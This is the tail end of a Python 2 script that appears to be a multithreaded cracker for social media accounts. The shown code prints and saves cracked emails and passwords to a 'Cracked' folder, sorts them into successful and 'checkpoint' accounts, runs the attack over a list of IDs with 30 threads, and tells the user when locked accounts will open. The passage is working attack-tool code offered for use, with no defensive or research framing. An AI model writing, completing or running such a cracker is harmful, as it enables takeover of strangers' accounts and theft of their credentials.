                                                    print('\x1b[31;1mAccount On Check-point')
				                    print('\x1b[31;1mEmail : \x1b[37;1m' + k + c + user)
				                    print('\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n'+"\x1b[0m")
                                                    cps = open('Cracked/Checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                        
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print '================================='
    print 'Total \nSUCCESS : '+str(len(oks))+'\nCheck-Point : '+str(len(cpb))
    print('Accounts Cracked Has Been Saved : /Cracked/')
    jalan("Note : Your CP account Will Open after 7 days")
    print ''
    print """
    ███


"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
